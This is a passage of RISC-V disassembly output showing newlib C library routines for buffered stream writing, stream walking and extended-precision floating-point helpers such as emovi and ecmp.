   12f7a:	85a2                	mv	a1,s0
   12f7c:	8556                	mv	a0,s5
   12f7e:	e0cff0ef          	jal	ra,1258a <__swsetup_r>
   12f82:	28051863          	bnez	a0,13212 <__sfvwrite_r+0x326>
   12f86:	01045783          	lhu	a5,16(s0)
   12f8a:	000a3903          	ld	s2,0(s4)
   12f8e:	0027f713          	andi	a4,a5,2
   12f92:	ff41                	bnez	a4,12f2a <__sfvwrite_r+0x3e>
   12f94:	0017f713          	andi	a4,a5,1
   12f98:	eb35                	bnez	a4,1300c <__sfvwrite_r+0x120>
   12f9a:	4444                	lw	s1,12(s0)
   12f9c:	6008                	ld	a0,0(s0)
   12f9e:	80000b37          	lui	s6,0x80000
   12fa2:	ffeb4b93          	xori	s7,s6,-2
   12fa6:	4c01                	li	s8,0
   12fa8:	4981                	li	s3,0
   12faa:	fffb4b13          	not	s6,s6
   12fae:	8ca6                	mv	s9,s1
   12fb0:	04098863          	beqz	s3,13000 <__sfvwrite_r+0x114>
   12fb4:	2007f713          	andi	a4,a5,512
   12fb8:	12070a63          	beqz	a4,130ec <__sfvwrite_r+0x200>
   12fbc:	8d26                	mv	s10,s1
   12fbe:	1899f763          	bgeu	s3,s1,1314c <__sfvwrite_r+0x260>
   12fc2:	8cce                	mv	s9,s3
   12fc4:	8d4e                	mv	s10,s3
   12fc6:	866a                	mv	a2,s10
   12fc8:	85e2                	mv	a1,s8
   12fca:	5b3020ef          	jal	ra,15d7c <memmove>
   12fce:	4458                	lw	a4,12(s0)
   12fd0:	601c                	ld	a5,0(s0)
   12fd2:	84ce                	mv	s1,s3
   12fd4:	41970cbb          	subw	s9,a4,s9
   12fd8:	97ea                	add	a5,a5,s10
   12fda:	01942623          	sw	s9,12(s0)
   12fde:	e01c                	sd	a5,0(s0)
   12fe0:	4981                	li	s3,0
   12fe2:	010a3603          	ld	a2,16(s4)
   12fe6:	9c26                	add	s8,s8,s1
   12fe8:	409604b3          	sub	s1,a2,s1
   12fec:	009a3823          	sd	s1,16(s4)
   12ff0:	ccbd                	beqz	s1,1306e <__sfvwrite_r+0x182>
   12ff2:	4444                	lw	s1,12(s0)
   12ff4:	6008                	ld	a0,0(s0)
   12ff6:	01045783          	lhu	a5,16(s0)
   12ffa:	8ca6                	mv	s9,s1
   12ffc:	fa099ce3          	bnez	s3,12fb4 <__sfvwrite_r+0xc8>
   13000:	00093c03          	ld	s8,0(s2)
   13004:	00893983          	ld	s3,8(s2)
   13008:	0941                	addi	s2,s2,16
   1300a:	b755                	j	12fae <__sfvwrite_r+0xc2>
   1300c:	4981                	li	s3,0
   1300e:	4501                	li	a0,0
   13010:	4c81                	li	s9,0
   13012:	4c01                	li	s8,0
   13014:	080c0b63          	beqz	s8,130aa <__sfvwrite_r+0x1be>
   13018:	c145                	beqz	a0,130b8 <__sfvwrite_r+0x1cc>
   1301a:	8bce                	mv	s7,s3
   1301c:	013c7363          	bgeu	s8,s3,13022 <__sfvwrite_r+0x136>
   13020:	8be2                	mv	s7,s8
   13022:	6008                	ld	a0,0(s0)
   13024:	6c1c                	ld	a5,24(s0)
   13026:	5014                	lw	a3,32(s0)
   13028:	84de                	mv	s1,s7
   1302a:	00a7f763          	bgeu	a5,a0,13038 <__sfvwrite_r+0x14c>
   1302e:	445c                	lw	a5,12(s0)
   13030:	00d78b3b          	addw	s6,a5,a3
   13034:	097b4d63          	blt	s6,s7,130ce <__sfvwrite_r+0x1e2>
   13038:	18dbc463          	blt	s7,a3,131c0 <__sfvwrite_r+0x2d4>
   1303c:	603c                	ld	a5,64(s0)
   1303e:	780c                	ld	a1,48(s0)
   13040:	8666                	mv	a2,s9
   13042:	8556                	mv	a0,s5
   13044:	9782                	jalr	a5
   13046:	84aa                	mv	s1,a0
   13048:	04a05763          	blez	a0,13096 <__sfvwrite_r+0x1aa>
   1304c:	0005079b          	sext.w	a5,a0
   13050:	40f989bb          	subw	s3,s3,a5
   13054:	4505                	li	a0,1
   13056:	02098b63          	beqz	s3,1308c <__sfvwrite_r+0x1a0>
   1305a:	010a3783          	ld	a5,16(s4)
   1305e:	9ca6                	add	s9,s9,s1
   13060:	409c0c33          	sub	s8,s8,s1
   13064:	409784b3          	sub	s1,a5,s1
   13068:	009a3823          	sd	s1,16(s4)
   1306c:	f4c5                	bnez	s1,13014 <__sfvwrite_r+0x128>
   1306e:	4501                	li	a0,0
   13070:	60e6                	ld	ra,88(sp)
   13072:	6446                	ld	s0,80(sp)
   13074:	64a6                	ld	s1,72(sp)
   13076:	6906                	ld	s2,64(sp)
   13078:	79e2                	ld	s3,56(sp)
   1307a:	7a42                	ld	s4,48(sp)
   1307c:	7aa2                	ld	s5,40(sp)
   1307e:	7b02                	ld	s6,32(sp)
   13080:	6be2                	ld	s7,24(sp)
   13082:	6c42                	ld	s8,16(sp)
   13084:	6ca2                	ld	s9,8(sp)
   13086:	6d02                	ld	s10,0(sp)
   13088:	6125                	addi	sp,sp,96
   1308a:	8082                	ret
   1308c:	85a2                	mv	a1,s0
   1308e:	8556                	mv	a0,s5
   13090:	845ff0ef          	jal	ra,128d4 <_fflush_r>
   13094:	d179                	beqz	a0,1305a <__sfvwrite_r+0x16e>
   13096:	01041783          	lh	a5,16(s0)
   1309a:	0407e793          	ori	a5,a5,64
   1309e:	00f41823          	sh	a5,16(s0)
   130a2:	557d                	li	a0,-1
   130a4:	b7f1                	j	13070 <__sfvwrite_r+0x184>
   130a6:	4501                	li	a0,0
   130a8:	8082                	ret
   130aa:	00893c03          	ld	s8,8(s2)
   130ae:	00093c83          	ld	s9,0(s2)
   130b2:	0941                	addi	s2,s2,16
   130b4:	fe0c0be3          	beqz	s8,130aa <__sfvwrite_r+0x1be>
   130b8:	8662                	mv	a2,s8
   130ba:	45a9                	li	a1,10
   130bc:	8566                	mv	a0,s9
   130be:	343020ef          	jal	ra,15c00 <memchr>
   130c2:	12050f63          	beqz	a0,13200 <__sfvwrite_r+0x314>
   130c6:	0505                	addi	a0,a0,1
   130c8:	419509bb          	subw	s3,a0,s9
   130cc:	b7b9                	j	1301a <__sfvwrite_r+0x12e>
   130ce:	85e6                	mv	a1,s9
   130d0:	865a                	mv	a2,s6
   130d2:	4ab020ef          	jal	ra,15d7c <memmove>
   130d6:	601c                	ld	a5,0(s0)
   130d8:	85a2                	mv	a1,s0
   130da:	8556                	mv	a0,s5
   130dc:	97da                	add	a5,a5,s6
   130de:	e01c                	sd	a5,0(s0)
   130e0:	ff4ff0ef          	jal	ra,128d4 <_fflush_r>
   130e4:	f94d                	bnez	a0,13096 <__sfvwrite_r+0x1aa>
   130e6:	87da                	mv	a5,s6
   130e8:	84da                	mv	s1,s6
   130ea:	b79d                	j	13050 <__sfvwrite_r+0x164>
   130ec:	6c1c                	ld	a5,24(s0)
   130ee:	02a7e863          	bltu	a5,a0,1311e <__sfvwrite_r+0x232>
   130f2:	501c                	lw	a5,32(s0)
   130f4:	02f9e563          	bltu	s3,a5,1311e <__sfvwrite_r+0x232>
   130f8:	86ce                	mv	a3,s3
   130fa:	013bf363          	bgeu	s7,s3,13100 <__sfvwrite_r+0x214>
   130fe:	86da                	mv	a3,s6
   13100:	02f6c6bb          	divw	a3,a3,a5
   13104:	6038                	ld	a4,64(s0)
   13106:	780c                	ld	a1,48(s0)
   13108:	8662                	mv	a2,s8
   1310a:	8556                	mv	a0,s5
   1310c:	02f686bb          	mulw	a3,a3,a5
   13110:	9702                	jalr	a4
   13112:	84aa                	mv	s1,a0
   13114:	f8a051e3          	blez	a0,13096 <__sfvwrite_r+0x1aa>
   13118:	409989b3          	sub	s3,s3,s1
   1311c:	b5d9                	j	12fe2 <__sfvwrite_r+0xf6>
   1311e:	0099f363          	bgeu	s3,s1,13124 <__sfvwrite_r+0x238>
   13122:	84ce                	mv	s1,s3
   13124:	8626                	mv	a2,s1
   13126:	85e2                	mv	a1,s8
   13128:	455020ef          	jal	ra,15d7c <memmove>
   1312c:	445c                	lw	a5,12(s0)
   1312e:	6018                	ld	a4,0(s0)
   13130:	409786bb          	subw	a3,a5,s1
   13134:	9726                	add	a4,a4,s1
   13136:	c454                	sw	a3,12(s0)
   13138:	e018                	sd	a4,0(s0)
   1313a:	fef9                	bnez	a3,13118 <__sfvwrite_r+0x22c>
   1313c:	85a2                	mv	a1,s0
   1313e:	8556                	mv	a0,s5
   13140:	f94ff0ef          	jal	ra,128d4 <_fflush_r>
   13144:	f929                	bnez	a0,13096 <__sfvwrite_r+0x1aa>
   13146:	409989b3          	sub	s3,s3,s1
   1314a:	bd61                	j	12fe2 <__sfvwrite_r+0xf6>
   1314c:	4807f713          	andi	a4,a5,1152
   13150:	e6070be3          	beqz	a4,12fc6 <__sfvwrite_r+0xda>
   13154:	5004                	lw	s1,32(s0)
   13156:	6c0c                	ld	a1,24(s0)
   13158:	00198713          	addi	a4,s3,1
   1315c:	0014969b          	slliw	a3,s1,0x1
   13160:	9ea5                	addw	a3,a3,s1
   13162:	8d0d                	sub	a0,a0,a1
   13164:	01f6d49b          	srliw	s1,a3,0x1f
   13168:	00050d1b          	sext.w	s10,a0
   1316c:	9cb5                	addw	s1,s1,a3
   1316e:	4014d49b          	sraiw	s1,s1,0x1
   13172:	976a                	add	a4,a4,s10
   13174:	00e4f563          	bgeu	s1,a4,1317e <__sfvwrite_r+0x292>
   13178:	0019849b          	addiw	s1,s3,1
   1317c:	9ca9                	addw	s1,s1,a0
   1317e:	4007f793          	andi	a5,a5,1024
   13182:	cfa9                	beqz	a5,131dc <__sfvwrite_r+0x2f0>
   13184:	85a6                	mv	a1,s1
   13186:	8556                	mv	a0,s5
   13188:	408020ef          	jal	ra,15590 <_malloc_r>
   1318c:	8caa                	mv	s9,a0
   1318e:	cd25                	beqz	a0,13206 <__sfvwrite_r+0x31a>
   13190:	6c0c                	ld	a1,24(s0)
   13192:	866a                	mv	a2,s10
   13194:	30b020ef          	jal	ra,15c9e <memcpy>
   13198:	01045783          	lhu	a5,16(s0)
   1319c:	b7f7f793          	andi	a5,a5,-1153
   131a0:	0807e793          	ori	a5,a5,128
   131a4:	00f41823          	sh	a5,16(s0)
   131a8:	01ac8533          	add	a0,s9,s10
   131ac:	41a487bb          	subw	a5,s1,s10
   131b0:	01943c23          	sd	s9,24(s0)
   131b4:	e008                	sd	a0,0(s0)
   131b6:	d004                	sw	s1,32(s0)
   131b8:	8cce                	mv	s9,s3
   131ba:	c45c                	sw	a5,12(s0)
   131bc:	8d4e                	mv	s10,s3
   131be:	b521                	j	12fc6 <__sfvwrite_r+0xda>
   131c0:	865e                	mv	a2,s7
   131c2:	85e6                	mv	a1,s9
   131c4:	3b9020ef          	jal	ra,15d7c <memmove>
   131c8:	4458                	lw	a4,12(s0)
   131ca:	6010                	ld	a2,0(s0)
   131cc:	000b879b          	sext.w	a5,s7
   131d0:	4177073b          	subw	a4,a4,s7
   131d4:	965e                	add	a2,a2,s7
   131d6:	c458                	sw	a4,12(s0)
   131d8:	e010                	sd	a2,0(s0)
   131da:	bd9d                	j	13050 <__sfvwrite_r+0x164>
   131dc:	8626                	mv	a2,s1
   131de:	8556                	mv	a0,s5
   131e0:	7f4030ef          	jal	ra,169d4 <_realloc_r>
   131e4:	8caa                	mv	s9,a0
   131e6:	f169                	bnez	a0,131a8 <__sfvwrite_r+0x2bc>
   131e8:	6c0c                	ld	a1,24(s0)
   131ea:	8556                	mv	a0,s5
   131ec:	ab1ff0ef          	jal	ra,12c9c <_free_r>
   131f0:	01041783          	lh	a5,16(s0)
   131f4:	4731                	li	a4,12
   131f6:	00eaa023          	sw	a4,0(s5)
   131fa:	f7f7f793          	andi	a5,a5,-129
   131fe:	bd71                	j	1309a <__sfvwrite_r+0x1ae>
   13200:	001c099b          	addiw	s3,s8,1
   13204:	bd19                	j	1301a <__sfvwrite_r+0x12e>
   13206:	4731                	li	a4,12
   13208:	01041783          	lh	a5,16(s0)
   1320c:	00eaa023          	sw	a4,0(s5)
   13210:	b569                	j	1309a <__sfvwrite_r+0x1ae>
   13212:	557d                	li	a0,-1
   13214:	bdb1                	j	13070 <__sfvwrite_r+0x184>

0000000000013216 <_fwalk>:
   13216:	715d                	addi	sp,sp,-80
   13218:	f84a                	sd	s2,48(sp)
   1321a:	f44e                	sd	s3,40(sp)
   1321c:	f052                	sd	s4,32(sp)
   1321e:	ec56                	sd	s5,24(sp)
   13220:	e85a                	sd	s6,16(sp)
   13222:	e45e                	sd	s7,8(sp)
   13224:	e486                	sd	ra,72(sp)
   13226:	e0a2                	sd	s0,64(sp)
   13228:	fc26                	sd	s1,56(sp)
   1322a:	8a2e                	mv	s4,a1
   1322c:	52050913          	addi	s2,a0,1312
   13230:	4b01                	li	s6,0
   13232:	0b000a93          	li	s5,176
   13236:	4b85                	li	s7,1
   13238:	59fd                	li	s3,-1
   1323a:	00892783          	lw	a5,8(s2)
   1323e:	01093403          	ld	s0,16(s2)
   13242:	02f05b63          	blez	a5,13278 <_fwalk+0x62>
   13246:	fff7849b          	addiw	s1,a5,-1
   1324a:	1482                	slli	s1,s1,0x20
   1324c:	9081                	srli	s1,s1,0x20
   1324e:	0485                	addi	s1,s1,1
   13250:	035484b3          	mul	s1,s1,s5
   13254:	94a2                	add	s1,s1,s0
   13256:	01045783          	lhu	a5,16(s0)
   1325a:	00fbfb63          	bgeu	s7,a5,13270 <_fwalk+0x5a>
   1325e:	01241783          	lh	a5,18(s0)
   13262:	8522                	mv	a0,s0
   13264:	01378663          	beq	a5,s3,13270 <_fwalk+0x5a>
   13268:	9a02                	jalr	s4
   1326a:	01656b33          	or	s6,a0,s6
   1326e:	2b01                	sext.w	s6,s6
   13270:	0b040413          	addi	s0,s0,176
   13274:	fe8491e3          	bne	s1,s0,13256 <_fwalk+0x40>
   13278:	00093903          	ld	s2,0(s2)
   1327c:	fa091fe3          	bnez	s2,1323a <_fwalk+0x24>
   13280:	60a6                	ld	ra,72(sp)
   13282:	6406                	ld	s0,64(sp)
   13284:	74e2                	ld	s1,56(sp)
   13286:	7942                	ld	s2,48(sp)
   13288:	79a2                	ld	s3,40(sp)
   1328a:	7a02                	ld	s4,32(sp)
   1328c:	6ae2                	ld	s5,24(sp)
   1328e:	6ba2                	ld	s7,8(sp)
   13290:	855a                	mv	a0,s6
   13292:	6b42                	ld	s6,16(sp)
   13294:	6161                	addi	sp,sp,80
   13296:	8082                	ret

0000000000013298 <_fwalk_reent>:
   13298:	715d                	addi	sp,sp,-80
   1329a:	f84a                	sd	s2,48(sp)
   1329c:	f44e                	sd	s3,40(sp)
   1329e:	f052                	sd	s4,32(sp)
   132a0:	ec56                	sd	s5,24(sp)
   132a2:	e85a                	sd	s6,16(sp)
   132a4:	e45e                	sd	s7,8(sp)
   132a6:	e062                	sd	s8,0(sp)
   132a8:	e486                	sd	ra,72(sp)
   132aa:	e0a2                	sd	s0,64(sp)
   132ac:	fc26                	sd	s1,56(sp)
   132ae:	8c2a                	mv	s8,a0
   132b0:	8a2e                	mv	s4,a1
   132b2:	52050913          	addi	s2,a0,1312
   132b6:	4b01                	li	s6,0
   132b8:	0b000a93          	li	s5,176
   132bc:	4b85                	li	s7,1
   132be:	59fd                	li	s3,-1
   132c0:	00892783          	lw	a5,8(s2)
   132c4:	01093403          	ld	s0,16(s2)
   132c8:	02f05c63          	blez	a5,13300 <_fwalk_reent+0x68>
   132cc:	fff7849b          	addiw	s1,a5,-1
   132d0:	1482                	slli	s1,s1,0x20
   132d2:	9081                	srli	s1,s1,0x20
   132d4:	0485                	addi	s1,s1,1
   132d6:	035484b3          	mul	s1,s1,s5
   132da:	94a2                	add	s1,s1,s0
   132dc:	01045783          	lhu	a5,16(s0)
   132e0:	00fbfc63          	bgeu	s7,a5,132f8 <_fwalk_reent+0x60>
   132e4:	01241783          	lh	a5,18(s0)
   132e8:	85a2                	mv	a1,s0
   132ea:	8562                	mv	a0,s8
   132ec:	01378663          	beq	a5,s3,132f8 <_fwalk_reent+0x60>
   132f0:	9a02                	jalr	s4
   132f2:	01656b33          	or	s6,a0,s6
   132f6:	2b01                	sext.w	s6,s6
   132f8:	0b040413          	addi	s0,s0,176
   132fc:	fe8490e3          	bne	s1,s0,132dc <_fwalk_reent+0x44>
   13300:	00093903          	ld	s2,0(s2)
   13304:	fa091ee3          	bnez	s2,132c0 <_fwalk_reent+0x28>
   13308:	60a6                	ld	ra,72(sp)
   1330a:	6406                	ld	s0,64(sp)
   1330c:	74e2                	ld	s1,56(sp)
   1330e:	7942                	ld	s2,48(sp)
   13310:	79a2                	ld	s3,40(sp)
   13312:	7a02                	ld	s4,32(sp)
   13314:	6ae2                	ld	s5,24(sp)
   13316:	6ba2                	ld	s7,8(sp)
   13318:	6c02                	ld	s8,0(sp)
   1331a:	855a                	mv	a0,s6
   1331c:	6b42                	ld	s6,16(sp)
   1331e:	6161                	addi	sp,sp,80
   13320:	8082                	ret

0000000000013322 <eshdn1>:
   13322:	00450693          	addi	a3,a0,4
   13326:	4781                	li	a5,0
   13328:	0569                	addi	a0,a0,26
   1332a:	7861                	lui	a6,0xffff8
   1332c:	a811                	j	13340 <eshdn1+0x1e>
   1332e:	0017979b          	slliw	a5,a5,0x1
   13332:	00e69023          	sh	a4,0(a3)
   13336:	17c2                	slli	a5,a5,0x30
   13338:	0689                	addi	a3,a3,2
   1333a:	93c1                	srli	a5,a5,0x30
   1333c:	02d50863          	beq	a0,a3,1336c <eshdn1+0x4a>
   13340:	0006d703          	lhu	a4,0(a3)
   13344:	00177613          	andi	a2,a4,1
   13348:	c219                	beqz	a2,1334e <eshdn1+0x2c>
   1334a:	0017e793          	ori	a5,a5,1
   1334e:	8305                	srli	a4,a4,0x1
   13350:	0027f613          	andi	a2,a5,2
   13354:	010765b3          	or	a1,a4,a6
   13358:	da79                	beqz	a2,1332e <eshdn1+0xc>
   1335a:	0017979b          	slliw	a5,a5,0x1
   1335e:	00b69023          	sh	a1,0(a3)
   13362:	17c2                	slli	a5,a5,0x30
   13364:	0689                	addi	a3,a3,2
   13366:	93c1                	srli	a5,a5,0x30
   13368:	fcd51ce3          	bne	a0,a3,13340 <eshdn1+0x1e>
   1336c:	8082                	ret

000000000001336e <eshup1>:
   1336e:	01850693          	addi	a3,a0,24
   13372:	4701                	li	a4,0
   13374:	0509                	addi	a0,a0,2
   13376:	a811                	j	1338a <eshup1+0x1c>
   13378:	0017171b          	slliw	a4,a4,0x1
   1337c:	00f69023          	sh	a5,0(a3)
   13380:	1742                	slli	a4,a4,0x30
   13382:	16f9                	addi	a3,a3,-2
   13384:	9341                	srli	a4,a4,0x30
   13386:	04d50063          	beq	a0,a3,133c6 <eshup1+0x58>
   1338a:	0006d783          	lhu	a5,0(a3)
   1338e:	0107961b          	slliw	a2,a5,0x10
   13392:	4106561b          	sraiw	a2,a2,0x10
   13396:	02061593          	slli	a1,a2,0x20
   1339a:	0017979b          	slliw	a5,a5,0x1
   1339e:	0005d463          	bgez	a1,133a6 <eshup1+0x38>
   133a2:	00176713          	ori	a4,a4,1
   133a6:	17c2                	slli	a5,a5,0x30
   133a8:	93c1                	srli	a5,a5,0x30
   133aa:	00277613          	andi	a2,a4,2
   133ae:	0017e593          	ori	a1,a5,1
   133b2:	d279                	beqz	a2,13378 <eshup1+0xa>
   133b4:	0017171b          	slliw	a4,a4,0x1
   133b8:	00b69023          	sh	a1,0(a3)
   133bc:	1742                	slli	a4,a4,0x30
   133be:	16f9                	addi	a3,a3,-2
   133c0:	9341                	srli	a4,a4,0x30
   133c2:	fcd514e3          	bne	a0,a3,1338a <eshup1+0x1c>
   133c6:	8082                	ret

00000000000133c8 <m16m>:
   133c8:	1101                	addi	sp,sp,-32
   133ca:	6e41                	lui	t3,0x10
   133cc:	00011b23          	sh	zero,22(sp)
   133d0:	00011c23          	sh	zero,24(sp)
   133d4:	05e1                	addi	a1,a1,24
   133d6:	083c                	addi	a5,sp,24
   133d8:	00410813          	addi	a6,sp,4
   133dc:	1e7d                	addi	t3,t3,-1
   133de:	0005d703          	lhu	a4,0(a1)
   133e2:	17f9                	addi	a5,a5,-2
   133e4:	15f9                	addi	a1,a1,-2
   133e6:	e315                	bnez	a4,1340a <m16m+0x42>
   133e8:	fe079f23          	sh	zero,-2(a5)
   133ec:	ff0799e3          	bne	a5,a6,133de <m16m+0x16>
   133f0:	0611                	addi	a2,a2,4
   133f2:	01a10693          	addi	a3,sp,26
   133f6:	0007d703          	lhu	a4,0(a5)
   133fa:	0789                	addi	a5,a5,2
   133fc:	0609                	addi	a2,a2,2
   133fe:	fee61f23          	sh	a4,-2(a2)
   13402:	fed79ae3          	bne	a5,a3,133f6 <m16m+0x2e>
   13406:	6105                	addi	sp,sp,32
   13408:	8082                	ret
   1340a:	02a70733          	mul	a4,a4,a0
   1340e:	0027d883          	lhu	a7,2(a5)
   13412:	0007d303          	lhu	t1,0(a5)
   13416:	01c776b3          	and	a3,a4,t3
   1341a:	96c6                	add	a3,a3,a7
   1341c:	8341                	srli	a4,a4,0x10
   1341e:	0106d893          	srli	a7,a3,0x10
   13422:	971a                	add	a4,a4,t1
   13424:	9746                	add	a4,a4,a7
   13426:	01075893          	srli	a7,a4,0x10
   1342a:	00d79123          	sh	a3,2(a5)
   1342e:	00e79023          	sh	a4,0(a5)
   13432:	ff179f23          	sh	a7,-2(a5)
   13436:	fb0794e3          	bne	a5,a6,133de <m16m+0x16>
   1343a:	bf5d                	j	133f0 <m16m+0x28>

000000000001343c <eisnan.part.0>:
   1343c:	01250713          	addi	a4,a0,18
   13440:	00055783          	lhu	a5,0(a0)
   13444:	0509                	addi	a0,a0,2
   13446:	e789                	bnez	a5,13450 <eisnan.part.0+0x14>
   13448:	fee51ce3          	bne	a0,a4,13440 <eisnan.part.0+0x4>
   1344c:	4501                	li	a0,0
   1344e:	8082                	ret
   13450:	4505                	li	a0,1
   13452:	8082                	ret

0000000000013454 <eneg>:
   13454:	1101                	addi	sp,sp,-32
   13456:	e426                	sd	s1,8(sp)
   13458:	01255483          	lhu	s1,18(a0)
   1345c:	e822                	sd	s0,16(sp)
   1345e:	ec06                	sd	ra,24(sp)
   13460:	fff4c793          	not	a5,s1
   13464:	03179713          	slli	a4,a5,0x31
   13468:	842a                	mv	s0,a0
   1346a:	e701                	bnez	a4,13472 <eneg+0x1e>
   1346c:	fd1ff0ef          	jal	ra,1343c <eisnan.part.0>
   13470:	e509                	bnez	a0,1347a <eneg+0x26>
   13472:	77e1                	lui	a5,0xffff8
   13474:	8cbd                	xor	s1,s1,a5
   13476:	00941923          	sh	s1,18(s0)
   1347a:	60e2                	ld	ra,24(sp)
   1347c:	6442                	ld	s0,16(sp)
   1347e:	64a2                	ld	s1,8(sp)
   13480:	6105                	addi	sp,sp,32
   13482:	8082                	ret

0000000000013484 <eisneg>:
   13484:	1141                	addi	sp,sp,-16
   13486:	e022                	sd	s0,0(sp)
   13488:	01255403          	lhu	s0,18(a0)
   1348c:	e406                	sd	ra,8(sp)
   1348e:	fff44793          	not	a5,s0
   13492:	03179713          	slli	a4,a5,0x31
   13496:	e711                	bnez	a4,134a2 <eisneg+0x1e>
   13498:	fa5ff0ef          	jal	ra,1343c <eisnan.part.0>
   1349c:	87aa                	mv	a5,a0
   1349e:	4501                	li	a0,0
   134a0:	e399                	bnez	a5,134a6 <eisneg+0x22>
   134a2:	00f45513          	srli	a0,s0,0xf
   134a6:	60a2                	ld	ra,8(sp)
   134a8:	6402                	ld	s0,0(sp)
   134aa:	0141                	addi	sp,sp,16
   134ac:	8082                	ret

00000000000134ae <emovi>:
   134ae:	01255783          	lhu	a5,18(a0)
   134b2:	7139                	addi	sp,sp,-64
   134b4:	f822                	sd	s0,48(sp)
   134b6:	00f7d79b          	srliw	a5,a5,0xf
   134ba:	f426                	sd	s1,40(sp)
   134bc:	fc06                	sd	ra,56(sp)
   134be:	f04a                	sd	s2,32(sp)
   134c0:	ec4e                	sd	s3,24(sp)
   134c2:	40f007bb          	negw	a5,a5
   134c6:	00f59023          	sh	a5,0(a1)
   134ca:	01255783          	lhu	a5,18(a0)
   134ce:	6721                	lui	a4,0x8
   134d0:	177d                	addi	a4,a4,-1
   134d2:	8ff9                	and	a5,a5,a4
   134d4:	00f59123          	sh	a5,2(a1)
   134d8:	84aa                	mv	s1,a0
   134da:	01050413          	addi	s0,a0,16
   134de:	02e78863          	beq	a5,a4,1350e <emovi+0x60>
   134e2:	00658793          	addi	a5,a1,6
   134e6:	00059223          	sh	zero,4(a1)
   134ea:	1579                	addi	a0,a0,-2
   134ec:	00045703          	lhu	a4,0(s0)
   134f0:	1479                	addi	s0,s0,-2
   134f2:	0789                	addi	a5,a5,2
   134f4:	fee79f23          	sh	a4,-2(a5) # ffffffffffff7ffe <__BSS_END__+0xfffffffffffbf976>
   134f8:	fe851ae3          	bne	a0,s0,134ec <emovi+0x3e>
   134fc:	00059c23          	sh	zero,24(a1)
   13500:	70e2                	ld	ra,56(sp)
   13502:	7442                	ld	s0,48(sp)
   13504:	74a2                	ld	s1,40(sp)
   13506:	7902                	ld	s2,32(sp)
   13508:	69e2                	ld	s3,24(sp)
   1350a:	6121                	addi	sp,sp,64
   1350c:	8082                	ret
   1350e:	0007869b          	sext.w	a3,a5
   13512:	01255783          	lhu	a5,18(a0)
   13516:	00458913          	addi	s2,a1,4
   1351a:	8ff5                	and	a5,a5,a3
   1351c:	02d79663          	bne	a5,a3,13548 <emovi+0x9a>
   13520:	e42e                	sd	a1,8(sp)
   13522:	f1bff0ef          	jal	ra,1343c <eisnan.part.0>
   13526:	65a2                	ld	a1,8(sp)
   13528:	c105                	beqz	a0,13548 <emovi+0x9a>
   1352a:	00658793          	addi	a5,a1,6
   1352e:	00059223          	sh	zero,4(a1)
   13532:	ffc48513          	addi	a0,s1,-4
   13536:	00045703          	lhu	a4,0(s0)
   1353a:	1479                	addi	s0,s0,-2
   1353c:	0789                	addi	a5,a5,2
   1353e:	fee79f23          	sh	a4,-2(a5)
   13542:	fe851ae3          	bne	a0,s0,13536 <emovi+0x88>
   13546:	bf6d                	j	13500 <emovi+0x52>
   13548:	01a58993          	addi	s3,a1,26
   1354c:	0909                	addi	s2,s2,2
   1354e:	fe091f23          	sh	zero,-2(s2)
   13552:	ff299de3          	bne	s3,s2,1354c <emovi+0x9e>
   13556:	70e2                	ld	ra,56(sp)
   13558:	7442                	ld	s0,48(sp)
   1355a:	74a2                	ld	s1,40(sp)
   1355c:	7902                	ld	s2,32(sp)
   1355e:	69e2                	ld	s3,24(sp)
   13560:	6121                	addi	sp,sp,64
   13562:	8082                	ret

0000000000013564 <ecmp>:
   13564:	01255783          	lhu	a5,18(a0)
   13568:	711d                	addi	sp,sp,-96
   1356a:	e8a2                	sd	s0,80(sp)
   1356c:	fff7c793          	not	a5,a5
   13570:	e4a6                	sd	s1,72(sp)
   13572:	ec86                	sd	ra,88(sp)
   13574:	03179713          	slli	a4,a5,0x31
   13578:	84aa                	mv	s1,a0
   1357a:	842e                	mv	s0,a1
   1357c:	e701                	bnez	a4,13584 <ecmp+0x20>
   1357e:	ebfff0ef          	jal	ra,1343c <eisnan.part.0>
   13582:	ed39                	bnez	a0,135e0 <ecmp+0x7c>
   13584:	01245783          	lhu	a5,18(s0)
   13588:	fff7c793          	not	a5,a5
   1358c:	03179713          	slli	a4,a5,0x31
   13590:	c721                	beqz	a4,135d8 <ecmp+0x74>
   13592:	858a                	mv	a1,sp
   13594:	8526                	mv	a0,s1
   13596:	f19ff0ef          	jal	ra,134ae <emovi>
   1359a:	100c                	addi	a1,sp,32
   1359c:	8522                	mv	a0,s0
   1359e:	f11ff0ef          	jal	ra,134ae <emovi>
   135a2:	00015583          	lhu	a1,0(sp)
   135a6:	02015783          	lhu	a5,32(sp)
   135aa:	02b78d63          	beq	a5,a1,135e4 <ecmp+0x80>
   135ae:	00210793          	addi	a5,sp,2
   135b2:	02210713          	addi	a4,sp,34
   135b6:	0830                	addi	a2,sp,24
   135b8:	0007d683          	lhu	a3,0(a5)
   135bc:	0789                	addi	a5,a5,2
   135be:	e2ad                	bnez	a3,13620 <ecmp+0xbc>
   135c0:	00075683          	lhu	a3,0(a4) # 8000 <register_fini-0x80b0>
   135c4:	0709                	addi	a4,a4,2
   135c6:	eea9                	bnez	a3,13620 <ecmp+0xbc>
   135c8:	fec798e3          	bne	a5,a2,135b8 <ecmp+0x54>
   135cc:	4501                	li	a0,0
   135ce:	60e6                	ld	ra,88(sp)
   135d0:	6446                	ld	s0,80(sp)
   135d2:	64a6                	ld	s1,72(sp)
   135d4:	6125                	addi	sp,sp,96
   135d6:	8082                	ret
   135d8:	8522                	mv	a0,s0
   135da:	e63ff0ef          	jal	ra,1343c <eisnan.part.0>
   135de:	d955                	beqz	a0,13592 <ecmp+0x2e>
   135e0:	5579                	li	a0,-2
   135e2:	b7f5                	j	135ce <ecmp+0x6a>
   135e4:	4505                	li	a0,1
   135e6:	e1a9                	bnez	a1,13628 <ecmp+0xc4>
   135e8:	00215603          	lhu	a2,2(sp)
   135ec:	02215683          	lhu	a3,34(sp)
   135f0:	00210713          	addi	a4,sp,2
   135f4:	02210793          	addi	a5,sp,34
   135f8:	182c                	addi	a1,sp,56
   135fa:	0789                	addi	a5,a5,2
   135fc:	0709                	addi	a4,a4,2
   135fe:	00d61c63          	bne	a2,a3,13616 <ecmp+0xb2>
   13602:	fcb785e3          	beq	a5,a1,135cc <ecmp+0x68>
   13606:	00075603          	lhu	a2,0(a4)
   1360a:	0007d683          	lhu	a3,0(a5)
   1360e:	0709                	addi	a4,a4,2
   13610:	0789                	addi	a5,a5,2
   13612:	fed608e3          	beq	a2,a3,13602 <ecmp+0x9e>
   13616:	fac6ece3          	bltu	a3,a2,135ce <ecmp+0x6a>
   1361a:	40a0053b          	negw	a0,a0
